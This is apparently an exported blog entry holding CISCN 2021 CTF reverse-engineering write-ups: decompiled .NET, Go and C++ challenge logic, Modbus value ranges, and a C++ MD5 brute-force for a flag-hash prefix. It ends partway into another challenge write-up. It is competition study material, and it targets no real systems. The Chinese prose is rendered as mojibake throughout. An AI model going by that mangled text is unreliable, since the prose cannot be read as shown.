å‡ºç°çš„åœ°æ–¹ï¼ˆè¿™å°±ä½“ç°å‡ºè¿™ç§è¾“å‡ºæ–¹æ³•çš„ä¼˜åŠ¿äº†ï¼‰\nç„¶åå‘ç° a[1] ä¼šåœ¨ä¸€å¼€å§‹èµ‹å€¼ä¸º 1ï¼Œä½†ä¸€æ—¦è¿›å…¥ while(a[2]) è¿™ç§å¤§å¾ªç¯ï¼Œå°±ä¼šå‡ºç° a[1]=0 çš„èµ‹å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åœ¨è¿›å…¥å¾ªç¯å‰è®© a[2]==0\næŸ¥çœ‹ä¸€ä¸‹ä» getchar åˆ° while ä¹‹é—´çš„ä»£ç ï¼ŒæŠŠé‡å¤å‡ºç°çš„ ++ éƒ½åˆå¹¶ä¸€ä¸‹\nè¿™é‡Œä»¥ç¬¬ä¸€æ¬¡ getchar çš„ä»£ç ä¸ºä¾‹ï¼Œï¼ˆå‰©ä¸‹å‡ æ¬¡å½¢å¼å‡ ä¹å®Œå…¨ä¸€è‡´ï¼Œå°±æ˜¯å‚æ•°æœ‰ç‚¹å°å˜åŒ–è€Œå·²ï¼‰\na[2] = getchar(); while (a[3]) { --a[3]; } while (a[4]) { --a[4]; } ++a[4]; ++a[4]; ++a[4]; ++a[4]; ++a[4]; ++a[4]; ++a[4]; while (a[4]) { ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; ++a[3]; --a[4]; } while (a[3]) { --a[2]; --a[3]; } while (a[2]) { while (a[4]) { --a[4]; } while (a[5]) { --a[5]; } while (a[1]) { --a[1]; } while (a[4]) { ++a[5]; ++a[1]; --a[4]; } while (a[5]) { ++a[4]; --a[5]; } while (a[2]) { --a[2]; } } while (a[2]) { --a[2]; } ç¾åŒ–ä¸€ä¸‹ï¼š\na[2] = getchar(); a[3] = 0; a[4] = 7; while (a[4]) { a[3] += 11 --a[4]; } // a[3] = a[4] * 11 = 77 a[2] -= a[3] while (a[2]) { a[4] = 0; a[5] = 0; a[1] = 0; a[2] = 0; } a[2] = 0; ç®€å•åœ°è¯´å°±æ˜¯ä¼šç”Ÿæˆä¸€ä¸ªæ•°å­—ï¼Œç„¶åç”¨ a[2] å»å‡ï¼Œå¦‚æœç»“æœä¸º 0ï¼Œå°±é€šè¿‡éªŒè¯äº†ï¼Œå¯¹æ‰€æœ‰çš„è¾“å…¥éƒ½æä¸€æ¬¡ï¼Œå°±èƒ½æ‹¿åˆ°äº”ä¸ªè¾“å…¥å­—ç¬¦ M5Ya7\næ€»ç»“ åšè¿™é“é¢˜çš„æ—¶å€™ï¼Œæœ€å¤§çš„é—®é¢˜å°±æ˜¯æ²¡æœ‰æœç´¢è¶³å¤Ÿçš„èµ„æ–™ï¼Œå¦‚æœç¬¬ä¸€æ­¥æƒ³å‡ºæ¥çš„è¯çš„ï¼Œä»¥æ¯”èµ›çš„æ—¶é—´ï¼Œåº”è¯¥è¿˜æ˜¯æœ‰æœºä¼šåšå‡ºæ¥è¿™é“é¢˜çš„ï¼Œæ¯•ç«Ÿåç»­çš„å·¥ä½œéƒ½æ˜¯ä½“åŠ›æ´»ï¼Œä¸€ç‚¹ä¸€ç‚¹åšä¸‹å»åº”è¯¥å°±å·®ä¸å¤šèƒ½å‡ºæ¥äº†\nä¸è¿‡ä¸ç®¡æ€ä¹ˆè¯´ï¼Œè¡¥é¢˜çš„è¿‡ç¨‹è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿çš„ï¼Œæ¯”å¦‚â€œç—…æ¯’å¼â€æ··æ·†å¯ä»¥ç›´æ¥ç”¨è¾“å‡ºæ¥è§£ï¼Œbrainfuckçš„å°å‹è§£é‡Šå™¨æ€ä¹ˆçœ‹ï¼Œä»¥åŠæœ€åç›´æ¥è¾“å‡ºç´¢å¼•åœ°å€ï¼Œåšé¢˜ç»éªŒ++\nHMI å…ˆè¯´ç»“è®ºï¼šå±‘é¢˜\nå‚è€ƒäº†è¿™ç¯‡åšå®¢ï¼šhttps://myts2.cn/2021/05/16/ciscn2021/\né€†å‘åˆ†æ ç”¨ file å‘½ä»¤çœ‹ä¸€çœ¼ï¼Œå‘ç°å…¨æ˜¯ .NETï¼Œç›´æ¥ä¸Š dnSpy\nå…ˆæœç´¢ CISCN å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°æœ€åçš„éªŒè¯å’Œè¾“å‡º\nchecked { while (!string.IsNullOrEmpty(AnalogValueDisplay.combined[num4])) { num4++; if (num4 \u0026gt; 7) { IL_1B9: if (num3 == 0) { string hash = AnalogValueDisplay.GetHash(string.Join(\u0026#34;,\u0026#34;, AnalogValueDisplay.combined)); Console.WriteLine(\u0026#34;Booooooooooooooooom!\u0026#34;); if (Operators.CompareString(hash.Substring(0, 10), \u0026#34;F0B278CCB9\u0026#34;, false) == 0) { Console.WriteLine(\u0026#34;CISCN{\u0026#34; + hash + \u0026#34;}\u0026#34;); } } return; } } num3 = 1; goto IL_1B9; } æ‰€ä»¥æœ€åéœ€è¦é€šè¿‡ä¸€ä¸ªmd5éªŒè¯ï¼Œç„¶åå¾€å›æ‰¾ combined æ˜¯ä»€ä¹ˆï¼Œå‘ç°æ˜¯ä» text èµ‹å€¼çš„\nè€Œå…·ä½“èµ‹å€¼åˆ°å“ªé‡Œï¼Œåˆ™æ˜¯ç”± num2 å†³å®šçš„ï¼Œ num2 æ˜¯ä¸€ä¸² 41047 - 41054 çš„å­—ç¬¦ä¸²\næ¯”èµ›çš„æ—¶å€™åªçŸ¥é“è¿™ä¸ªæ˜¯ä¸€ä¸ªç«¯å£ï¼Œä½†å…·ä½“æ˜¯ä»€ä¹ˆæ²¡æå‡ºæ¥ï¼Œç–¯ç‹‚å¾€å›æ‰¾å¼•ç”¨å‘ç°æ‰¾ä¸åˆ°ä¸œè¥¿ï¼Œæ€€ç–‘è¿˜æ˜¯éœ€è¦è¿œç¨‹å¾€é‡Œé¢æ‰“æ•°æ®ï¼Œå› æ­¤å°è¯•æ­å»ºGRFICSçš„å¹³å°ï¼ˆé˜Ÿå†…å¤§ä½¬æ‰¾åˆ°çš„ï¼‰ï¼Œæœ€åç†¬ä¸åŠ¨æ”¾å¼ƒäº†\nå‚è€ƒåˆ«äººçš„wpä¹‹åå‘ç°éœ€è¦ä½¿ç”¨ Modbus Slave å¾€é‡Œé¢æ‰“æ•°æ®ï¼Œå¼€å§‹è¡¥é¢˜\nModbus Slaveè°ƒè¯• ä¹‹å‰æ‰¾åˆ°çš„ 401** åŸæ¥å°±æ˜¯ Modbus çš„ç«¯å£ï¼Œæ‰€ä»¥åªéœ€è¦ç”¨ Modbus Slave å¾€ç›¸åº”ç«¯å£æ·»åŠ æ•°æ®å°±è¡Œ\nå…ˆç›´æ¥è¿è¡Œæ‰¾åˆ°ç²—ç•¥çš„èŒƒå›´ï¼ˆè°ƒè¯•ä¿®æ”¹æ•°æ®å¤ªæ…¢äº†ï¼‰ï¼Œç›®æ ‡å°±æ˜¯è®©æ•°å­—éƒ½å˜æˆç™½è‰²\nåœ¨ç²—æŸ¥çš„æ—¶å€™å°±èƒ½å‘ç°å°æ•°ç‚¹åæœ‰ä¸€äº›ä½ç½®åœ¨ exe ç•Œé¢æ˜¯çœ‹ä¸åˆ°çš„\næ˜ç¡®èŒƒå›´åè¿› dnSpy è°ƒè¯•ï¼Œæ€»ç»“å‡ºä¸€ä¸ªè¡¨æ ¼\nmin max dif combined i $41046$ $52.8016$ $17312$ $52.8992$ $17344$ $0.00305$ $0.00305$ $2$ $41047$ $25.0002$ $1634$ $25.092$ $1640$ $0.0153$ $0.0153$ $1$ $41048$ $62.10105$ $20361$ $62.19865$ $20393$ $0.00305$ $0.00305$ $0$ $41049$ $406.6128$ $26576$ $406.6893$ $26581$ $0.0153$ $0.0153$ $3$ $41050$ $54.00025$ $17705$ $54.09785$ $17737$ $0.00305$ $0.00305$ $7$ $41051$ $158.0031$ $10327$ $158.0949$ $10333$ $0.0153$ $0.0153$ $6$ $41052$ $22.0027$ $7214$ $22.09725$ $7245$ $0.00305$ $0.00305$ $4$ $41053$ $13.1121$ $857$ $13.1886$ $862$ $0.0153$ $0.0153$ $5$ æ¥ä¸‹æ¥åœ¨è¿™ä¸€èŒƒå›´å†…è¿›è¡Œçˆ†ç ´å°±å¥½äº†\nå¯¹èŒƒå›´åšäº†ä¸ªè®¡ç®—ï¼Œæˆ‘æå‡ºæ¥çš„æ˜¯ 2028571776ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆå‚è€ƒæ¯”æˆ‘è¿™ä¸ªå°ä¸€ç‚¹\nçˆ†ç ´ å› ä¸ºæœ€åè¦ç®— md5ï¼Œæ‰€ä»¥ç²¾åº¦ä¸èƒ½æœ‰é—®é¢˜ï¼Œåˆå› ä¸ºçˆ†ç ´èŒƒå›´å¤§æ¦‚åœ¨ 20 äº¿å·¦å³ï¼Œæ‰€ä»¥é€Ÿåº¦ä¹Ÿä¸èƒ½æ…¢\näºæ˜¯å†³å®šå…ˆç”¨pythonçš„Decimalæ¥ç®—å°æ•°ï¼Œå†ç”¨cppæ±‚è§£\nfrom decimal import Decimal min = [52.8016, 25.0002, 62.10105, 406.6128, 54.00025, 158.0031, 22.0027, 13.1121] max = [52.8992, 25.092, 62.19865, 406.6893, 54.09785, 158.0949, 22.09725, 13.1886] dif = [0.00305, 0.0153, 0.00305, 0.0153, 0.00305, 0.0153, 0.00305, 0.0153] round = [33, 7, 33, 6, 33, 7, 32, 6] for i in range(8): min[i] = str(min[i]) max[i] = str(max[i]) dif[i] = str(dif[i]) res = min[i] for _ in range(round[i]): print (res, end = \u0026#39;, \u0026#39;) res = Decimal(res) + Decimal(dif[i]) print () æœ€åç®—å‡ºæ¥çš„ç»“å°¾ä¼šæœ‰0ï¼Œæ‰‹åŠ¨å»é™¤ä¸€ä¸‹å°±è¡Œ\nç„¶åç”¨cppè¿›è¡Œçˆ†ç ´ï¼Œè¿™é‡Œå†™çš„æ¯”è¾ƒæ‡’\n#pragma GCC optimize(3) #include \u0026lt;bits/stdc++.h\u0026gt; #include \u0026lt;openssl/md5.h\u0026gt; using namespace std; string combine[8][40] = { {\u0026#34;62.10105\u0026#34;, \u0026#34;62.1041\u0026#34;, \u0026#34;62.10715\u0026#34;, \u0026#34;62.1102\u0026#34;, \u0026#34;62.11325\u0026#34;, \u0026#34;62.1163\u0026#34;, \u0026#34;62.11935\u0026#34;, \u0026#34;62.1224\u0026#34;, \u0026#34;62.12545\u0026#34;, \u0026#34;62.1285\u0026#34;, \u0026#34;62.13155\u0026#34;, \u0026#34;62.1346\u0026#34;, \u0026#34;62.13765\u0026#34;, \u0026#34;62.1407\u0026#34;, \u0026#34;62.14375\u0026#34;, \u0026#34;62.1468\u0026#34;, \u0026#34;62.14985\u0026#34;, \u0026#34;62.1529\u0026#34;, \u0026#34;62.15595\u0026#34;, \u0026#34;62.1590\u0026#34;, \u0026#34;62.16205\u0026#34;, \u0026#34;62.1651\u0026#34;, \u0026#34;62.16815\u0026#34;, \u0026#34;62.1712\u0026#34;, \u0026#34;62.17425\u0026#34;, \u0026#34;62.1773\u0026#34;, \u0026#34;62.18035\u0026#34;, \u0026#34;62.1834\u0026#34;, \u0026#34;62.18645\u0026#34;, \u0026#34;62.1895\u0026#34;, \u0026#34;62.19255\u0026#34;, \u0026#34;62.1956\u0026#34;, \u0026#34;62.19865\u0026#34;}, {\u0026#34;25.0002\u0026#34;, \u0026#34;25.0155\u0026#34;, \u0026#34;25.0308\u0026#34;, \u0026#34;25.0461\u0026#34;, \u0026#34;25.0614\u0026#34;, \u0026#34;25.0767\u0026#34;, \u0026#34;25.092\u0026#34;}, {\u0026#34;52.8016\u0026#34;, \u0026#34;52.80465\u0026#34;, \u0026#34;52.8077\u0026#34;, \u0026#34;52.81075\u0026#34;, \u0026#34;52.8138\u0026#34;, \u0026#34;52.81685\u0026#34;, \u0026#34;52.8199\u0026#34;, \u0026#34;52.82295\u0026#34;, \u0026#34;52.8260\u0026#34;, \u0026#34;52.82905\u0026#34;, \u0026#34;52.8321\u0026#34;, \u0026#34;52.83515\u0026#34;, \u0026#34;52.8382\u0026#34;, \u0026#34;52.84125\u0026#34;, \u0026#34;52.8443\u0026#34;, \u0026#34;52.84735\u0026#34;, \u0026#34;52.8504\u0026#34;, \u0026#34;52.85345\u0026#34;, \u0026#34;52.8565\u0026#34;, \u0026#34;52.85955\u0026#34;, \u0026#34;52.8626\u0026#34;, \u0026#34;52.86565\u0026#34;, \u0026#34;52.8687\u0026#34;, \u0026#34;52.87175\u0026#34;, \u0026#34;52.8748\u0026#34;, \u0026#34;52.87785\u0026#34;, \u0026#34;52.8809\u0026#34;, \u0026#34;52.88395\u0026#34;, \u0026#34;52.8870\u0026#34;, \u0026#34;52.89005\u0026#34;, \u0026#34;52.8931\u0026#34;, \u0026#34;52.89615\u0026#34;, \u0026#34;52.8992\u0026#34;}, {\u0026#34;406.6128\u0026#34;, \u0026#34;406.6281\u0026#34;, \u0026#34;406.6434\u0026#34;, \u0026#34;406.6587\u0026#34;, \u0026#34;406.674\u0026#34;, \u0026#34;406.6893\u0026#34;}, {\u0026#34;22.0027\u0026#34;, \u0026#34;22.00575\u0026#34;, \u0026#34;22.0088\u0026#34;, \u0026#34;22.01185\u0026#34;, \u0026#34;22.0149\u0026#34;, \u0026#34;22.01795\u0026#34;, \u0026#34;22.0210\u0026#34;, \u0026#34;22.02405\u0026#34;, \u0026#34;22.0271\u0026#34;, \u0026#34;22.03015\u0026#34;, \u0026#34;22.0332\u0026#34;, \u0026#34;22.03625\u0026#34;, \u0026#34;22.0393\u0026#34;, \u0026#34;22.04235\u0026#34;, \u0026#34;22.0454\u0026#34;, \u0026#34;22.04845\u0026#34;, \u0026#34;22.0515\u0026#34;, \u0026#34;22.05455\u0026#34;, \u0026#34;22.0576\u0026#34;, \u0026#34;22.06065\u0026#34;, \u0026#34;22.0637\u0026#34;, \u0026#34;22.06675\u0026#34;, \u0026#34;22.0698\u0026#34;, \u0026#34;22.07285\u0026#34;, \u0026#34;22.0759\u0026#34;, \u0026#34;22.07895\u0026#34;, \u0026#34;22.0820\u0026#34;, \u0026#34;22.08505\u0026#34;, \u0026#34;22.0881\u0026#34;, \u0026#34;22.09115\u0026#34;, \u0026#34;22.0942\u0026#34;, \u0026#34;22.09725\u0026#34;}, {\u0026#34;13.1121\u0026#34;, \u0026#34;13.1274\u0026#34;, \u0026#34;13.1427\u0026#34;, \u0026#34;13.158\u0026#34;, \u0026#34;13.1733\u0026#34;, \u0026#34;13.1886\u0026#34;}, {\u0026#34;158.0031\u0026#34;, \u0026#34;158.0184\u0026#34;, \u0026#34;158.0337\u0026#34;, \u0026#34;158.049\u0026#34;, \u0026#34;158.0643\u0026#34;, \u0026#34;158.0796\u0026#34;, \u0026#34;158.0949\u0026#34;}, {\u0026#34;54.00025\u0026#34;, \u0026#34;54.0033\u0026#34;, \u0026#34;54.00635\u0026#34;, \u0026#34;54.0094\u0026#34;, \u0026#34;54.01245\u0026#34;, \u0026#34;54.0155\u0026#34;, \u0026#34;54.01855\u0026#34;, \u0026#34;54.0216\u0026#34;, \u0026#34;54.02465\u0026#34;, \u0026#34;54.0277\u0026#34;, \u0026#34;54.03075\u0026#34;, \u0026#34;54.0338\u0026#34;, \u0026#34;54.03685\u0026#34;, \u0026#34;54.0399\u0026#34;, \u0026#34;54.04295\u0026#34;, \u0026#34;54.0460\u0026#34;, \u0026#34;54.04905\u0026#34;, \u0026#34;54.0521\u0026#34;, \u0026#34;54.05515\u0026#34;, \u0026#34;54.0582\u0026#34;, \u0026#34;54.06125\u0026#34;, \u0026#34;54.0643\u0026#34;, \u0026#34;54.06735\u0026#34;, \u0026#34;54.0704\u0026#34;, \u0026#34;54.07345\u0026#34;, \u0026#34;54.0765\u0026#34;, \u0026#34;54.07955\u0026#34;, \u0026#34;54.0826\u0026#34;, \u0026#34;54.08565\u0026#34;, \u0026#34;54.0887\u0026#34;, \u0026#34;54.09175\u0026#34;, \u0026#34;54.0948\u0026#34;, \u0026#34;54.09785\u0026#34;}, }; int size[8] = {33, 7, 33, 6, 32, 6, 7, 33}; string MD5(const string\u0026amp; src ) { MD5_CTX ctx; string md5_string; unsigned char md[16] = { 0 }; char tmp[33] = { 0 }; MD5_Init( \u0026amp;ctx ); MD5_Update( \u0026amp;ctx, src.c_str(), src.size() ); MD5_Final( md, \u0026amp;ctx ); for( int i = 0; i \u0026lt; 16; ++i ) { memset( tmp, 0x00, sizeof( tmp ) ); sprintf( tmp, \u0026#34;%02X\u0026#34;, md[i] ); md5_string += tmp; } return md5_string; } int main(){ cout \u0026lt;\u0026lt; MD5(\u0026#34;62.10105,25.0002,52.8016,406.6128,22.0027,13.1121,158.0031,54.00025,\u0026#34;) \u0026lt;\u0026lt; endl; int cur[8] = {}; time_t start = clock(); for (long long i = 0; i \u0026lt; 2028571776; ++i){ string in = \u0026#34;\u0026#34;; for (int j = 0; j \u0026lt; 8; ++j){ if (cur[j] \u0026gt;= size[j]){ cur[j] = 0; ++cur[j + 1]; } in += combine[j][cur[j]]; in += \u0026#34;,\u0026#34;; } string out = MD5(in); cur[0] += 1; // cout \u0026lt;\u0026lt; in \u0026lt;\u0026lt; endl; if (out[0] == \u0026#39;F\u0026#39; \u0026amp;\u0026amp; out[1] == \u0026#39;0\u0026#39; \u0026amp;\u0026amp; out[2] == \u0026#39;B\u0026#39; \u0026amp;\u0026amp; out[3] == \u0026#39;2\u0026#39; \u0026amp;\u0026amp; out[4] == \u0026#39;7\u0026#39; \u0026amp;\u0026amp; out[5] == \u0026#39;8\u0026#39; \u0026amp;\u0026amp; out[6] == \u0026#39;C\u0026#39; \u0026amp;\u0026amp; out[7] == \u0026#39;C\u0026#39; \u0026amp;\u0026amp; out[8] == \u0026#39;B\u0026#39; \u0026amp;\u0026amp; out[9] == \u0026#39;9\u0026#39;){ cout \u0026lt;\u0026lt; \u0026#34;in:\u0026#34; \u0026lt;\u0026lt; in \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;out:\u0026#34; \u0026lt;\u0026lt; out \u0026lt;\u0026lt; endl; } if (i % 5000000 == 0) cout \u0026lt;\u0026lt; 100.0 * i / 2028571776 \u0026lt;\u0026lt; \u0026#34;%\u0026#34; \u0026lt;\u0026lt; endl; } time_t end = clock(); printf(\u0026#34;time=%fs\\n\u0026#34;, (double)(end - start)/CLOCKS_PER_SEC); return 0; } md5æ˜¯ç›´æ¥ä¸Šç½‘æŠ„çš„ï¼Œæ¥æºï¼šhttps://blog.csdn.net/u012063703/article/details/49178349\næœ€åçš„ç»“æœ\n... 60.8803% in:62.1834,25.0002,52.84735,406.6893,22.01795,13.1886,158.0031,54.06125, out:F0B278CCB982F6132DD6A834C4827D0D 61.1268% ... time=2639.569345s çˆ†ç ´å‡ºç­”æ¡ˆå¤§æ¦‚èŠ±äº† $60% \\times 2640=26.4\\min$\nç»“è®º è¿™é¢˜éš¾åº¦ä¸åœ¨äºé€†å‘ï¼Œå‰æœŸçš„åŸºæœ¬åˆ†æä»¥åŠåé¢éœ€è¦æ‰“æ•°æ®åŠ¨è°ƒè¿™äº›å’Œé€†å‘æœ‰å…³çš„æ“ä½œï¼Œæ¯”èµ›çš„æ—¶å€™å…¶å®éƒ½æƒ³åˆ°äº†ï¼Œä½†é—®é¢˜åœ¨äºä¸çŸ¥é“è¿˜æœ‰ Modbus Slave è¿™ç§ä¸œè¥¿\næ‰€ä»¥å…¨ç¨‹éƒ½å¾ˆè¿·èŒ«ï¼Œå®Œå…¨ä¸çŸ¥é“è¯¥æ€ä¹ˆåšï¼Œå®˜æ–¹çš„æç¤ºæ—©ä¸Šæ‰æ”¾å‡ºæ¥ï¼Œé‚£ä¼šéƒ½æ”¶å·¥å‡†å¤‡è¡¥è§‰äº†ï¼ˆä¸€ä¸ªå°æ—¶çš„æ—¶é—´ï¼Œæ‰¾æ•°æ®èŒƒå›´+å†™è„šæœ¬+çˆ†ç ´ï¼Œæ ¹æœ¬æ¥ä¸åŠå¥½å§ï¼‰\nä»¥åŠè¿‡ç¨‹ä¸­çš„è°ƒæ•°æ®å°±æ˜¯æ— é™äºŒåˆ†ï¼Œç´¯çš„ä¸€æ‰¹ï¼Œè¿™é¢˜è¯´æ˜¯ Misc æˆ‘éƒ½ä¿¡\næœ€åçš„çˆ†ç ´æ•°æ®é‡ä¹Ÿå¤ªå¤§äº†ï¼Œå‚è€ƒçš„åšå®¢ç”¨goè·‘äº†ä¸¤å°æ—¶ï¼Œæˆ‘è¿™è¾¹ç”¨c++è·‘äº†åŠä¸ªå°æ—¶ï¼Œä¸è¿‡é˜Ÿå‹ç”¨cçš„å¤šçº¿ç¨‹åªè·‘äº†åŠåˆ†é’Ÿï¼Œçœ‹æˆªå›¾åªçˆ†ç ´äº† $2%$ å°±å‡ºç»“æœäº†ï¼Œåº”è¯¥æ˜¯åˆ’åˆ†çš„ä½ç½®æ­£å¥½åœ¨ç­”æ¡ˆè¾¹ä¸Šï¼Œæœ‰æ—¶é—´å­¦ä¹ ä¸€ä¸‹å¤šçº¿ç¨‹\nç»¼ä¸Šï¼šå±‘é¢˜\ngift æ–°ç‰ˆæœ¬çš„GOå¯¹magic numberä»¥åŠä¸€äº›ç»“æ„ä¸Šéƒ½åšäº†ä¿®æ”¹ï¼Œæ‰€ä»¥è€ç‰ˆæœ¬çš„ç¬¦å·è¡¨ä¿®å¤è„šæœ¬å°±ä¸èƒ½ç”¨äº†ï¼Œå¥½åœ¨å…è´¹çš„ida7.6æ­£å¥½æ”¯æŒGOçš„ç¬¦å·è¡¨æ¢å¤ï¼Œå¯ä»¥ç›´æ¥åšäº†ã€‚\nä¸»å‡½æ•°ä¸»è¦éƒ¨åˆ†å¦‚ä¸‹\nmain_CISCN6666666(); main_CISCN66666666(); main_CISCN6666666666(); max_len_v2 = qword_928238; // 0x20 index_v3 = 0LL; while ( (__int64)index_v3 \u0026lt; max_len_v2 ) { qword_9720E8 = 0LL; if ( qword_928238 \u0026lt;= index_v3 ) runtime_panicIndex(); v14 = off_928230[index_v3]; runtime_makeslice((__int64)\u0026#34;\\b\u0026#34;, v14, v14, v10); v5 = (__int64 *)v11; v19 = (__int64 *)v11; v4 = 1LL; while ( v4 \u0026lt;= 4 ) { v12 = v4; main_wtf(0LL, v4, v5, v14, v14); v4 = v12 + 1; v5 = v19; } if ( (unsigned __int64)qword_9720E8 \u0026gt;= 0x11 ) runtime_panicIndex(); v6 = *((_BYTE *)\u0026amp;v16 + qword_9720E8); v22[0] = \u0026amp;unk_8765E0; // output_length v22[1] = \u0026amp;qword_9239C0[v6 ^ 0x66u]; // output v8 = qword_92EAB0; v10 = 2LL; v1 = v22; fmt_Fprintf(v0, (__int64)v22, (const char *)qword_9239C0); index_v3 += 1; } å¼€å¤´çš„ä¸‰ä¸ªCISCNå‡½æ•°æ˜¯ç®€å•çš„è¾“å‡ºï¼Œä¸­é—´ç”Ÿæˆç©ºçš„sliceç„¶åæ‰”åˆ°äº†wtfå‡½æ•°ä¸­ï¼Œè¾“å‡ºæ˜¯æ ¹æ®ç´¢å¼•ï¼Œä»qword_9239C0ä¸­é€‰æ‹©ä¸€ä¸ªå­—ç¬¦ã€‚\nå°è¯•è¿è¡Œçš„æ—¶å€™å‘ç°è¿è¡Œæ—¶é—´å¾ˆé•¿ï¼Œä½†åœ¨ç¨‹åºä¸­æ²¡æœ‰çœ‹åˆ°å»¶æ—¶çš„æ“ä½œï¼Œé‚£ä¹ˆè¿™é“é¢˜åº”è¯¥æ˜¯ä¸€ä¸ªè€—æ—¶çš„ç®—æ³•ã€‚\nè§‚å¯Ÿå‘ç° wtf å‡½æ•°æ˜¯ä¸€ä¸ªé€’å½’å‡½æ•°ï¼Œè€Œ off_928230 ä¸­å­˜çš„å°±æ˜¯é€’å½’çš„æ·±åº¦ã€‚\nå°è¯•æ‰¾è§„å¾‹ï¼Œç›´æ¥å°†æ·±åº¦patchæˆ 1 åˆ° 0x20ï¼Œè¿è¡Œä¸€ä¸‹ã€‚\nå¾—åˆ°å¦‚ä¸‹ç»“æœ\nWelcome to CISCN 2021! Here is our free flag for you as a gift: CISCN{45b3247c45b3247c4 çŒœæµ‹æœ€åçš„è¾“å‡ºæ˜¯æœ‰è§„å¾‹çš„\ncur_time = [ 1, 3, 6, 9, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x14, 0x19, 0x1E, 0x28, 0x42, 0x66, 0x0A0, 0x936, 0x3D21, 0x149A7, 0x243AC, 0x0CB5BE, 0x47DC61, 0x16C0F46, 0x262C432, 0x4ACE299, 0x10FBC92A, 0x329ECDFD, 0x370D7470 ] res = [\u0026#39;c\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;7\u0026#39;] print (\u0026#39;CISCN{\u0026#39;, end = \u0026#39;\u0026#39;) for c in cur_time: print (res[c % len(res)], end = \u0026#39;\u0026#39;) print (\u0026#39;}\u0026#39;) print (\u0026#39;CISCN{4b445b3247c45344c54c44734445452c}\u0026#39;) å’Œæœ€åçš„æ­£ç¡®ç»“æœåšä¸ªå¯¹æ¯”ï¼Œå‘ç°ä¸€æ ·ã€‚\n","date":"2021-05-20T01:21:59Z","permalink":"/post/ciscn2021-re-writeup/","title":"CISCN2021 RE writeup"},{"content":"å’Œä¸¤ä½å­¦é•¿ä¸€èµ·åšå‡ºæ¥çš„ï¼Œæ€»ç®—æ˜¯èƒ½åœ¨å›¢é˜Ÿèµ›ä¸­åšå‡ºæ¥é¢˜äº†ï¼Œç»“æŸäº†é•¿è¾¾ä¸€ä¸ªæœˆçš„ç™½ç»™ç”Ÿæ¶¯ï¼Œä¸å®¹æ˜“å•Š\næ€è·¯ å…ˆæ‹–åˆ° ida é‡Œè¿›è¡Œé™æ€åˆ†æ\næŸ¥çœ‹mainå‡½æ•°ï¼ŒæŠŠå˜é‡å®šä¹‰å’Œåˆå§‹åŒ–åˆ äº†ï¼Œå¹¶å°† cin çš„ä¸œè¥¿å‘½åä¸ºäº† input\n__int64 __fastcall main(int a1, char **a2, char **a3) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;\u0026gt;\u0026gt; \u0026#34;, a3); std::operator\u0026gt;\u0026gt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cin, input); if ( strlen(input) == 64 ) { v3 = input; v4 = \u0026amp;unk_55A06D2D0020; v5 = 0LL; do { v6 = hexstr2int(v3, 8); v7 = v14; sub_55A06D2CC408(\u0026amp;v14[v5], v6); sub_55A06D2CC408(\u0026amp;v18[v5], 17); v8 = v19; sub_55A06D2CC408(\u0026amp;v19[v5], *v4); ++v3; ++v4; v5 += 36LL; } while ( v3 != v21 ); sub_55A06D2CCB30(v14, v18, v9); sub_55A06D2CCB30(v15, v18, v10); sub_55A06D2CCB30(v16, v18, v11); sub_55A06D2CCB30(v17, v18, v12); while ( !sub_55A06D2CCADC(v7, v8) ) { v7 += 36; v8 += 36; if ( v7 == v18 ) { __printf_chk(1LL, \u0026#34;flag{%s}\\n\u0026#34;, input); return 0LL; } } puts(\u0026#34;error\u0026#34;); } else { puts(\u0026#34;error\u0026#34;); } return 0LL; } ç®€å•æŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°è¾“å…¥é•¿åº¦ä¸º64ï¼Œç„¶å do while çœ‹èµ·æ¥æ˜¯è¿›è¡Œåˆå§‹åŒ–ï¼Œåé¢çš„å››ä¸ªè¿ç»­å‡½æ•°åº”è¯¥æ˜¯åŠ å¯†\nåŒæ—¶ç¡®å®šè¿™ä¸ªåº”è¯¥æ˜¯ç®—æ³•é¢˜ï¼Œä¸æ¶‰åŠæ··æ·†ä¹‹ç±»çš„ä¸œè¥¿\näºæ˜¯æŸ¥çœ‹ä¸€ä¸‹ v6= çš„é‚£ä¸ªå‡½æ•°\n__int64 __fastcall hexstr2int(_BYTE *a1, int a2) { v2 = strlen(a0123456789abcd) + 1; // 17 if ( a2 \u0026lt;= 0 ) return 0LL; v3 = v2 - 1; v4 = a1; LODWORD(result) = 0; while ( 1 ) { if ( v3 \u0026lt;= 0 ) return 0LL; for ( i = 0LL; a0123456789abcd[i] != *v4; ++i ) {// inputæ˜¯0-f if ( i == v2 - 2 ) return 0LL; } if ( v3 \u0026lt;= i ) break; result = (i + (v2 - 1) * result); // inputè½¬æˆint if ( ++v4 == \u0026amp;a1[a2 - 1 + 1] ) return result; } return 0LL; } å‘ç°åº”è¯¥æ˜¯å°†è¾“å…¥è½¬æ¢æˆäº† intï¼Œè€Œä¸”è¾“å…¥çš„å­—ç¬¦å¿…é¡»å¾—åœ¨ 0123456789ABCDEF ä¸­\nç„¶åçœ‹ä¸€çœ¼é‡å¤å‡ºç°ä¸‰æ¬¡çš„ sub_55A06D2CCB30 å‡½æ•°\n__int64 __fastcall sub_55A06D2CC408(__int64 a1, int a2) { *(a1 + 8) = 0; *(a1 + 4) = a2; v2 = 4LL; while ( 1 ) { v3 = v2 - 1; if ( *(a1 + v2 + 3) ) break; if ( !--v2 ) goto LABEL_4; } v3 = v2; LABEL_4: *a1 = v3; return v3; } çœ‹èµ·æ¥å°±æ˜¯ç®€å•çš„èµ‹å€¼ï¼Œa1 